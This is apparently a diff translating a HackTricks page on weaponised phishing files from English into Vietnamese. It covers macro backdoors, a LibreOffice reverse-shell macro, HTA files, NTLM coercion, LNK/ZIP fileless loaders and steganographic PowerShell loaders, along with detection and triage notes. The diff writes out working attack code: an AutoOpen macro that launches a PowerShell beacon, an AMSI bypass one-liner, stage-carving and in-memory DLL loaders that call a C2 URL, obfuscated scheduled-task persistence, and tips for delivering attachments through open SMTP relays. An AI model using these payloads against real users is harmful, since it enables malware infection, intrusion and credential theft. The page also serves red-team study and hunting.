@@ -1,42 +1,42 @@
-# Phishing Files & Documents
+# Tệp và tài liệu phishing
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Documents
+## Tài liệu Office
 
-Microsoft Word performs file data validation before opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened.
+Microsoft Word thực hiện xác thực dữ liệu tệp trước khi mở tệp. Việc xác thực dữ liệu được thực hiện bằng cách nhận dạng cấu trúc dữ liệu theo tiêu chuẩn OfficeOpenXML. Nếu xảy ra lỗi trong quá trình nhận dạng cấu trúc dữ liệu, tệp đang được phân tích sẽ không được mở.
 
-Usually, Word files containing macros use the `.docm` extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
-For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
-The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).
+Thông thường, các tệp Word chứa macro sử dụng phần mở rộng `.docm`. Tuy nhiên, bạn có thể đổi tên tệp bằng cách thay đổi phần mở rộng mà vẫn giữ được khả năng thực thi macro.\
+Ví dụ: theo thiết kế, tệp RTF không hỗ trợ macro, nhưng tệp DOCM được đổi tên thành RTF vẫn sẽ được Microsoft Word xử lý và có thể thực thi macro.\
+Các cơ chế và thành phần bên trong tương tự cũng áp dụng cho toàn bộ phần mềm trong Microsoft Office Suite (Excel, PowerPoint, v.v.).
 
-You can use the following command to check which extensions are going to be executed by some Office programs:
+Bạn có thể sử dụng lệnh sau để kiểm tra những phần mở rộng nào sẽ được một số chương trình Office thực thi:
 
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
 
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+Các file DOCX tham chiếu đến một template từ xa (File –Options –Add-ins –Manage: Templates –Go) có chứa macro cũng có thể “thực thi” macro.
 
-### External Image Load
+### Tải ảnh bên ngoài
 
-Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
+Đi tới: _Insert --> Quick Parts --> Field_\
+_**Categories**: Links and References, **Field names**: includePicture, và **Filename or URL**:_ http://<ip>/whatever
 
 ![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
 
-### Macros Backdoor
+### Backdoor bằng macro
 
-It's possible to use macros to run arbitrary code from the document.
+Có thể dùng macro để chạy mã tùy ý từ tài liệu.
 
-#### Autoload functions
+#### Hàm tự động tải
 
-The more common they are, the more probable the AV will detect them.
+Chúng càng phổ biến thì khả năng bị AV phát hiện càng cao.
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
+#### Ví dụ mã macro
 
 ```vba
 Sub AutoOpen()
@@ -68,24 +68,24 @@ Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
 
-#### Manually remove metadata
+#### Xóa metadata theo cách thủ công
 
-Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.
+Đi tới **File > Info > Inspect Document > Inspect Document** để mở Document Inspector. Nhấp **Inspect**, sau đó nhấp **Remove All** bên cạnh **Document Properties and Personal Information**.
 
-#### Doc Extension
+#### Phần mở rộng Doc
 
-When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
-Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.
+Khi hoàn tất, chọn danh sách thả xuống **Save as type**, đổi định dạng từ **`.docx`** sang Word 97-2003 **`.doc`**.\
+Làm vậy vì bạn **không thể lưu macro bên trong tệp `.docx`** và phần mở rộng hỗ trợ macro **`.docm`** thường bị **nghi ngại** (ví dụ: biểu tượng hình thu nhỏ có dấu `!` rất lớn và một số cổng web/email chặn hoàn toàn các tệp này). Vì vậy, **phần mở rộng `.doc` cũ là lựa chọn dung hòa tốt nhất**.
 
-#### Malicious Macros Generators
+#### Công cụ tạo Malicious Macros
 
 - MacOS
   - [**macphish**](https://github.com/cldrn/macphish)
   - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## LibreOffice ODT auto-run macros (Basic)
+## Macro tự chạy LibreOffice ODT (Basic)
 
-LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> A simple reverse shell macro looks like:
+Tài liệu LibreOffice Writer có thể nhúng macro Basic và tự động thực thi khi mở tệp bằng cách gán macro cho sự kiện **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Một macro reverse shell đơn giản như sau:
 
 ```vb
 Sub Shell
@@ -93,18 +93,18 @@ Sub Shell
 End Sub
 ```
 
-Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.
+Lưu ý dấu ngoặc kép lặp (`""`) bên trong chuỗi – LibreOffice Basic dùng chúng để escape dấu ngoặc kép theo nghĩa đen, vì vậy các payload kết thúc bằng `...==""")` sẽ giữ cân bằng cả command bên trong lẫn đối số Shell.
 
-Delivery tips:
+Mẹo gửi:
 
-- Save as `.odt` and bind the macro to the document event so it fires immediately when opened.
-- When emailing with `swaks`, use `--attach @resume.odt` (the `@` is required so the file bytes, not the filename string, are sent as the attachment). This is critical when abusing SMTP servers that accept arbitrary `RCPT TO` recipients without validation.
+- Lưu dưới dạng `.odt` và gán macro cho sự kiện của tài liệu để macro chạy ngay khi tài liệu được mở.
+- Khi gửi email bằng `swaks`, hãy dùng `--attach @resume.odt` (`@` là bắt buộc để gửi nội dung file dưới dạng tệp đính kèm, thay vì chuỗi tên file). Điều này rất quan trọng khi khai thác các SMTP server chấp nhận người nhận `RCPT TO` tùy ý mà không xác thực.
 
-## HTA Files
+## Tệp HTA
 
-An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.
+HTA là một chương trình Windows **kết hợp HTML và các ngôn ngữ scripting (chẳng hạn như VBScript và JScript)**. Nó tạo giao diện người dùng và chạy như một ứng dụng "được tin cậy hoàn toàn", không bị giới hạn bởi mô hình bảo mật của trình duyệt.
 
-An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
+HTA được thực thi bằng **`mshta.exe`**, thường được **cài đặt** cùng với **Internet Explorer**, khiến **`mshta` phụ thuộc vào IE**. Vì vậy, nếu IE đã bị gỡ cài đặt, HTA sẽ không thể thực thi.
 
 ```html
 <--! Basic HTA Execution -->
@@ -161,19 +161,19 @@ An HTA is executed using **`mshta.exe`**, which is typically **installed** along
 </script>
 ```
 
-## Fake attachment cards in HTML email
+## Thẻ tệp đính kèm giả trong email HTML
 
-An HTML email can imitate a provider's native attachment-preview card instead of carrying a real attachment. Talos observed a Gmail card rebuilt from four Base64-encoded inline PNG MIME parts. The complete visual control was wrapped in one anchor, and a recipient value in `?m=<target-id>` enabled per-recipient tracking. The link began with `//` rather than `http://` or `https://`; browsers resolve that protocol-relative form, but URL extractors that match only fully qualified URLs can miss it.<sup>[[11]](#references)</sup>
+Email HTML có thể bắt chước thẻ xem trước tệp đính kèm gốc của nhà cung cấp thay vì chứa tệp đính kèm thật. Talos quan sát thấy một thẻ Gmail được dựng lại từ bốn phần MIME PNG nội tuyến mã hóa Base64. Toàn bộ phần tử hiển thị được bọc trong một anchor, và giá trị người nhận trong `?m=<target-id>` cho phép theo dõi từng người nhận. Liên kết bắt đầu bằng `//` thay vì `http://` hoặc `https://`; trình duyệt phân giải dạng URL tương đối theo giao thức này, nhưng các công cụ trích xuất URL chỉ khớp URL đầy đủ có thể bỏ sót nó.<sup>[[11]](#references)</sup>
 
-During analysis, inspect the raw MIME instead of trusting the rendered attachment list. Reconstruct how the inline image parts form the visual card, identify its enclosing anchor, and normalize protocol-relative `href` values before extracting URLs.<sup>[[11]](#references)</sup>
+Trong quá trình phân tích, hãy kiểm tra MIME thô thay vì tin vào danh sách tệp đính kèm đã hiển thị. Tái dựng cách các phần ảnh nội tuyến tạo thành thẻ hiển thị, xác định anchor bao quanh nó và chuẩn hóa các giá trị `href` tương đối theo giao thức trước khi trích xuất URL.<sup>[[11]](#references)</sup>
 
-For envelope/header sender spoofing and DMARC alignment testing, see [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).
+Để kiểm tra giả mạo người gửi trong envelope/header và căn chỉnh DMARC, xem [các biện pháp đối phó giả mạo thư SMTP](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).
 
-## Forcing NTLM Authentication
+## Buộc xác thực NTLM
 
-There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
+Có một số cách để **buộc xác thực NTLM từ xa**, chẳng hạn như thêm **ảnh vô hình** vào email hoặc HTML mà người dùng sẽ truy cập (thậm chí qua HTTP MitM?). Hoặc gửi cho nạn nhân **địa chỉ tệp** có thể **kích hoạt** **xác thực** chỉ bằng cách **mở thư mục**.
 
-**Check these ideas and more in the following pages:**
+**Xem các ý tưởng này và nhiều nội dung khác trong những trang sau:**
 
 
 {{#ref}}
@@ -187,24 +187,24 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 
 ### NTLM Relay
 
-Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
+Đừng quên rằng bạn không chỉ có thể đánh cắp hash hoặc thông tin xác thực mà còn có thể **thực hiện các cuộc tấn công NTLM relay**:
 
-- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+- [**Các cuộc tấn công NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+- [**AD CS ESC8 (NTLM relay tới chứng chỉ)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
-## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
+## LNK Loader + Payload nhúng trong ZIP (chuỗi fileless)
 
-Highly effective campaigns deliver a ZIP that contains two legitimate decoy documents (PDF/DOCX) and a malicious .lnk. The trick is that the actual PowerShell loader is stored inside the ZIP’s raw bytes after a unique marker, and the .lnk carves and runs it fully in memory.<sup>[[2]](#references)</sup>
+Các chiến dịch có hiệu quả cao phát tán một tệp ZIP chứa hai tài liệu mồi nhử hợp pháp (PDF/DOCX) và một tệp .lnk độc hại. Thủ thuật là loader PowerShell thực tế được lưu trong các byte thô của ZIP, sau một marker duy nhất, rồi .lnk trích xuất và chạy nó hoàn toàn trong bộ nhớ.<sup>[[2]](#references)</sup>
 
-Typical flow implemented by the .lnk PowerShell one-liner:
+Luồng điển hình do lệnh PowerShell một dòng trong .lnk thực hiện:
 
-1) Locate the original ZIP in common paths: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, and the parent of the current working directory.
-2) Read the ZIP bytes and find a hardcoded marker (e.g., xFIQCV). Everything after the marker is the embedded PowerShell payload.
-3) Copy the ZIP to %ProgramData%, extract there, and open the decoy .docx to appear legitimate.
-4) Bypass AMSI for the current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) Deobfuscate the next stage (e.g., remove all # characters) and execute it in memory.
+1) Tìm ZIP gốc trong các đường dẫn phổ biến: Desktop, Downloads, Documents, %TEMP%, %ProgramData% và thư mục cha của thư mục làm việc hiện tại.
+2) Đọc các byte ZIP và tìm marker được hardcode (ví dụ: xFIQCV). Mọi thứ sau marker là payload PowerShell được nhúng.
+3) Sao chép ZIP vào %ProgramData%, giải nén tại đó và mở tệp mồi nhử .docx để tạo vẻ hợp pháp.
+4) Bỏ qua AMSI cho tiến trình hiện tại: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Giải obfuscate stage tiếp theo (ví dụ: xóa tất cả ký tự #) và thực thi trong bộ nhớ.
 
-Example PowerShell skeleton to carve and run the embedded stage:
+Ví dụ khung PowerShell để trích xuất và chạy stage được nhúng:
 
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
@@ -223,35 +223,35 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 
-Notes
-- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
-- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.
+Ghi chú
+- Quá trình phân phối thường lạm dụng các subdomain PaaS có uy tín (ví dụ: *.herokuapp.com) và có thể giới hạn payload (phân phối ZIP vô hại dựa trên IP/UA).
+- Giai đoạn tiếp theo thường giải mã shellcode base64/XOR rồi thực thi bằng Reflection.Emit + VirtualAlloc để giảm thiểu dấu vết trên ổ đĩa.
 
-Persistence used in the same chain
-- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically.<sup>[[2]](#references)[[4]](#references)</sup> See details and ready-to-use commands here:
+Persistence được sử dụng trong cùng chuỗi
+- COM TypeLib hijacking của điều khiển Microsoft Web Browser để IE/Explorer hoặc bất kỳ ứng dụng nào nhúng điều khiển này tự động chạy lại payload.<sup>[[2]](#references)[[4]](#references)</sup> Xem chi tiết và các lệnh có thể dùng ngay tại đây:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Hunting/IOCs
-- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
-- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
-- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Long-running business threads ending with links hosted under trusted PaaS domains.
+Truy tìm/IOC
+- Các tệp ZIP có chứa chuỗi marker ASCII (ví dụ: xFIQCV) được nối vào dữ liệu archive.
+- Tệp .lnk liệt kê các thư mục cha/thư mục người dùng để tìm ZIP rồi mở tài liệu mồi.
+- Can thiệp AMSI qua [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Các chuỗi email công việc kéo dài, kết thúc bằng liên kết được lưu trữ trên các domain PaaS đáng tin cậy.
 
-## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading
+## Dàn dựng bằng mồi nhử LNK trước → persistence bằng scheduled task → side-loading CPL đáng tin cậy
 
-Another recurring pattern is a **document-impersonating `.lnk`** that immediately opens a benign lure while it stages the real chain in the background.<sup>[[3]](#references)</sup>
+Một mẫu thường gặp khác là **`.lnk` giả dạng tài liệu**, lập tức mở mồi nhử vô hại trong khi âm thầm dàn dựng chuỗi tấn công thực sự ở nền.<sup>[[3]](#references)</sup>
 
-Observed workflow:
-1. The shortcut **masquerades as a PDF** and uses `conhost.exe` or a similar proxy to spawn an obfuscated PowerShell downloader.
-2. The PowerShell fragments obvious tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) so naive detections looking for `iwr`, `gci`, `ren`, `cpi`, or `schtasks` miss the command.
-3. The stager downloads the **decoy document first**, opens it for the victim, and then reconstructs the malicious files in the background.
-4. Payloads may be written with **junk extensions** and then renamed by stripping filler characters, delaying the appearance of obvious `.exe` / `.cpl` artifacts.
-5. Persistence is established with a **minute-based scheduled task** that launches a trusted host binary from a user-writable path.
+Quy trình quan sát được:
+1. Shortcut **giả dạng PDF** và dùng `conhost.exe` hoặc proxy tương tự để khởi chạy trình tải xuống PowerShell đã làm rối.
+2. PowerShell phân mảnh các token dễ nhận biết (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) để các cơ chế phát hiện sơ sài tìm kiếm `iwr`, `gci`, `ren`, `cpi` hoặc `schtasks` không phát hiện được lệnh.
+3. Stager tải **tài liệu mồi trước**, mở tài liệu đó cho nạn nhân, rồi tái tạo các tệp độc hại ở nền.
+4. Payload có thể được ghi bằng **phần mở rộng giả** rồi đổi tên bằng cách loại bỏ các ký tự đệm, khiến các artifact `.exe` / `.cpl` dễ nhận biết xuất hiện muộn hơn.
+5. Persistence được thiết lập bằng **scheduled task chạy theo phút**, khởi chạy một binary host đáng tin cậy từ đường dẫn mà người dùng có thể ghi.
 
-Minimal hunting clues from this pattern:
+Các manh mối truy tìm tối thiểu từ mẫu này:
 
 ```powershell
 # Suspicious split-token PowerShell seen in LNK chains
@@ -260,25 +260,25 @@ r''e''n
 &(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
 ```
 
-A useful staging layout to recognize is:
+Một bố cục staging hữu ích cần nhận biết là:
 - `C:\Users\Public\<decoy>.pdf`
 - `C:\Users\Public\<trusted>.exe`
-- `C:\Users\Public\<malicious>.cpl` or `.dll`
+- `C:\Users\Public\<malicious>.cpl` hoặc `.dll`
 - `C:\Windows\Tasks\<blob>.dat`
 
-### Why the second stage is stealthy
+### Vì sao stage thứ hai khó bị phát hiện
 
-In the Rapid7 case study, the scheduled task repeatedly launched **`Fondue.exe`** from `C:\Users\Public\`. Because **`APPWIZ.cpl`** was staged next to it and exported **`RunFODW`**, the trusted Microsoft binary side-loaded the attacker CPL instead of the legitimate system copy.
+Trong nghiên cứu tình huống của Rapid7, scheduled task liên tục chạy **`Fondue.exe`** từ `C:\Users\Public\`. Vì **`APPWIZ.cpl`** được đặt cùng thư mục và export **`RunFODW`**, binary Microsoft đáng tin cậy đã side-load CPL của attacker thay vì bản hợp pháp trong hệ thống.
 
-The CPL then:
-- Reads an **AES-256-CBC** blob from `C:\Windows\Tasks\editor.dat`
-- Decrypts it through **Windows CNG / `bcrypt.dll`**
-- Allocates executable memory and copies the decrypted shellcode
-- Executes it indirectly by passing the shellcode pointer as the callback for **`EnumUILanguagesW`**
+Sau đó, CPL:
+- Đọc blob **AES-256-CBC** từ `C:\Windows\Tasks\editor.dat`
+- Giải mã blob thông qua **Windows CNG / `bcrypt.dll`**
+- Cấp phát bộ nhớ có quyền thực thi và sao chép shellcode đã giải mã vào đó
+- Thực thi shellcode gián tiếp bằng cách truyền con trỏ shellcode làm callback cho **`EnumUILanguagesW`**
 
-That last step is worth hunting separately: malware often avoids a direct `((void(*)())buf)()` jump and instead abuses a **legitimate callback-taking WinAPI** to transfer execution.
+Bước cuối này đáng được săn tìm riêng: malware thường tránh nhảy trực tiếp bằng `((void(*)())buf)()` mà thay vào đó lạm dụng một **WinAPI hợp pháp có nhận callback** để chuyển quyền thực thi.
 
-The decrypted payload in this campaign was **Donut** shellcode, which then mapped the final PE fully in memory and patched **AMSI/WLDP/ETW** in the current process before handing off execution. For deeper notes on side-loading and memory-resident post-processing, see:
+Payload được giải mã trong chiến dịch này là shellcode **Donut**; nó ánh xạ PE cuối cùng hoàn toàn vào bộ nhớ rồi vá **AMSI/WLDP/ETW** trong tiến trình hiện tại trước khi chuyển giao quyền thực thi. Để tìm hiểu sâu hơn về side-loading và xử lý hậu khai thác trong bộ nhớ, xem:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
@@ -288,30 +288,30 @@ The decrypted payload in this campaign was **Donut** shellcode, which then mappe
 ../../windows-hardening/av-bypass.md
 {{#endref}}
 
-Practical hunting pivots:
-- `.lnk` spawning `powershell.exe` or `conhost.exe` followed by a visible decoy document.
-- Short-lived downloads to **`C:\Users\Public\`** followed by immediate renames from nonsense extensions.
-- Scheduled tasks with bland names such as `GoogleErrorReport` executing from **user-writable directories**.
-- Trusted binaries loading **`.cpl` / `.dll`** files from the same non-system directory.
-- Base64 text blobs written under **`C:\Windows\Tasks\`** and then read by the side-loaded module.
+Các điểm thực tế để săn tìm:
+- `.lnk` khởi chạy `powershell.exe` hoặc `conhost.exe`, sau đó hiển thị một tài liệu mồi.
+- Tệp được tải xuống trong thời gian ngắn vào **`C:\Users\Public\`**, rồi ngay lập tức được đổi tên từ các phần mở rộng vô nghĩa.
+- Scheduled task có tên chung chung như `GoogleErrorReport`, chạy từ **các thư mục mà người dùng có quyền ghi**.
+- Binary đáng tin cậy tải tệp **`.cpl` / `.dll`** từ cùng thư mục không thuộc hệ thống.
+- Blob văn bản Base64 được ghi vào **`C:\Windows\Tasks\`**, rồi được module side-load đọc.
 
-## Steganography-delimited payloads in images (PowerShell stager)
+## Payload phân định bằng steganography trong ảnh (PowerShell stager)
 
-Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.<sup>[[5]](#references)</sup>
+Các chuỗi loader gần đây phân phối JavaScript/VBS đã làm rối; mã này giải mã và chạy PowerShell stager Base64. Stager tải xuống một ảnh (thường là GIF) chứa DLL .NET được mã hóa Base64, ẩn dưới dạng văn bản thuần giữa các dấu đánh dấu bắt đầu/kết thúc duy nhất. Script tìm các dấu phân cách này (ví dụ từng thấy ngoài thực tế: «<<sudo_png>> … <<sudo_odt>>>»), trích xuất phần văn bản nằm giữa, giải mã Base64 thành byte, nạp assembly vào bộ nhớ và gọi một phương thức entry đã biết với URL C2.<sup>[[5]](#references)</sup>
 
-Workflow
-- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
-- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
-- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> See more about process hollowing and trusted utility proxy execution here:
+Quy trình
+- Stage 1: JS/VBS dropper được lưu trữ → giải mã Base64 nhúng bên trong → khởi chạy PowerShell stager với -nop -w hidden -ep bypass.
+- Stage 2: PowerShell stager → tải ảnh xuống, trích xuất Base64 nằm giữa các dấu đánh dấu, nạp DLL .NET vào bộ nhớ và gọi phương thức của nó (ví dụ: VAI), truyền URL C2 cùng các tùy chọn.
+- Stage 3: Loader truy xuất payload cuối cùng và thường inject payload này bằng process hollowing vào một binary đáng tin cậy (thường là MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Tìm hiểu thêm về process hollowing và thực thi proxy thông qua tiện ích đáng tin cậy tại đây:
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
 {{#endref}}
 
-PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:
+Ví dụ PowerShell trích xuất DLL từ ảnh và gọi phương thức .NET trong bộ nhớ:
 
 <details>
-<summary>PowerShell stego payload extractor and loader</summary>
+<summary>Trình trích xuất và loader payload stego bằng PowerShell</summary>
 
 ```powershell
 # Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
@@ -337,12 +337,12 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 
 </details>
 
-Notes
-- This is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markers vary between campaigns.
-- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
-- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.
+Ghi chú
+- Đây là ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Các marker khác nhau giữa các chiến dịch.
+- AMSI/ETW bypass và giải obfuscation chuỗi thường được thực hiện trước khi tải assembly.
+- Săn tìm: quét ảnh đã tải xuống để tìm các dấu phân cách đã biết; xác định PowerShell truy cập ảnh và giải mã ngay các blob Base64.
 
-See also stego tools and carving techniques:
+Xem thêm các công cụ stego và kỹ thuật carving:
 
 {{#ref}}
 ../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
@@ -350,23 +350,23 @@ See also stego tools and carving techniques:
 
 ## JS/VBS droppers → Base64 PowerShell staging
 
-A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.<sup>[[5]](#references)</sup>
+Một stage ban đầu thường gặp là tệp `.js` hoặc `.vbs` nhỏ, bị obfuscation nặng và được gửi bên trong một archive. Mục đích duy nhất của nó là giải mã một chuỗi Base64 nhúng và khởi chạy PowerShell với `-nop -w hidden -ep bypass` để bootstrap stage tiếp theo qua HTTPS.<sup>[[5]](#references)</sup>
 
-Skeleton logic (abstract):
-- Read own file contents
-- Locate a Base64 blob between junk strings
-- Decode to ASCII PowerShell
-- Execute with `wscript.exe`/`cscript.exe` invoking `powershell.exe`
+Logic khung (khái quát):
+- Đọc nội dung tệp của chính nó
+- Tìm blob Base64 nằm giữa các chuỗi rác
+- Giải mã thành PowerShell ASCII
+- Thực thi bằng `wscript.exe`/`cscript.exe`, gọi `powershell.exe`
 
-Hunting cues
-- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
-- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.
+Dấu hiệu săn tìm
+- Tệp đính kèm JS/VBS trong archive khởi chạy `powershell.exe` với `-enc`/`FromBase64String` trong command line.
+- `wscript.exe` khởi chạy `powershell.exe -nop -w hidden` từ các đường dẫn temp của người dùng.
 
-## MSC documents as execution containers (GrimResource)
+## Tài liệu MSC làm container thực thi (GrimResource)
 
-Microsoft Management Console files (`.msc`) are XML console definitions normally opened by `mmc.exe`. **GrimResource** weaponizes a `StringTable` reference to an `apds.dll` resource containing an old XSS primitive, so a user opening the crafted console causes JavaScript to run inside `mmc.exe`. Observed samples combined `transformNode`-based obfuscation with **DotNetToJScript** to instantiate a .NET payload without the usual Office-macro path.<sup>[[9]](#references)</sup>
+Tệp Microsoft Management Console (`.msc`) là các định nghĩa console dạng XML, thường được mở bằng `mmc.exe`. **GrimResource** vũ khí hóa một tham chiếu `StringTable` đến tài nguyên `apds.dll` có chứa một XSS primitive cũ, khiến JavaScript chạy bên trong `mmc.exe` khi người dùng mở console được tạo thủ công. Các mẫu đã quan sát kết hợp kỹ thuật obfuscation dựa trên `transformNode` với **DotNetToJScript** để khởi tạo payload .NET mà không cần dùng đến đường thực thi macro Office thông thường.<sup>[[9]](#references)</sup>
 
-For static triage, treat an untrusted MSC as text and do **not** double-click it:<sup>[[9]](#references)</sup>
+Để phân tích tĩnh ban đầu, hãy coi MSC không đáng tin cậy là văn bản và **không** nhấp đúp vào nó:<sup>[[9]](#references)</sup>
 
 ```bash
 file lure.msc
@@ -375,13 +375,13 @@ grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64S
 strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
 ```
 
-High-signal runtime pivots are `mmc.exe` loading the CLR or script components, creating network connections, or spawning `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe`, or an unexpected executable. The format is legitimate, so detections should correlate **origin + suspicious XML/script content + `mmc.exe` behavior** instead of blocking every MSC.<sup>[[9]](#references)</sup>
+Các dấu hiệu runtime có giá trị cao gồm `mmc.exe` tải CLR hoặc các thành phần script, tạo kết nối mạng, hoặc khởi chạy `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` hay một executable không mong đợi. Định dạng này là hợp lệ, vì vậy các quy tắc phát hiện nên tương quan **nguồn gốc + nội dung XML/script đáng ngờ + hành vi của `mmc.exe`**, thay vì chặn mọi tệp MSC.<sup>[[9]](#references)</sup>
 
-## PDF/QR redirectors and payload gating
+## Tệp PDF/QR chuyển hướng và kiểm soát phân phối payload
 
-A PDF does not need an exploit to be useful. Recent campaigns place a **QR code or ordinary link** in a benign-looking document, move the browser session away from mail controls, and personalize the destination with the recipient address. Microsoft documented 2025 PDFs whose QR URLs were unique per recipient and led to RaccoonO365 credential-harvesting infrastructure; a parallel chain used IP/environment gating to return a JavaScript/MSI path to selected visitors but a benign PDF to scanners or disallowed clients.<sup>[[10]](#references)</sup>
+PDF không cần khai thác lỗ hổng mới có thể hữu ích. Các chiến dịch gần đây đặt **mã QR hoặc liên kết thông thường** trong một tài liệu trông có vẻ vô hại, đưa phiên trình duyệt ra khỏi các biện pháp kiểm soát email và cá nhân hóa đích đến bằng địa chỉ người nhận. Microsoft đã ghi nhận các tệp PDF năm 2025 có URL mã QR riêng cho từng người nhận, dẫn đến hạ tầng thu thập thông tin xác thực RaccoonO365; một chuỗi tấn công song song sử dụng cơ chế kiểm soát dựa trên IP/môi trường để trả về đường dẫn JavaScript/MSI cho những khách truy cập được chọn, nhưng trả về một PDF vô hại cho các trình quét hoặc client không được phép.<sup>[[10]](#references)</sup>
 
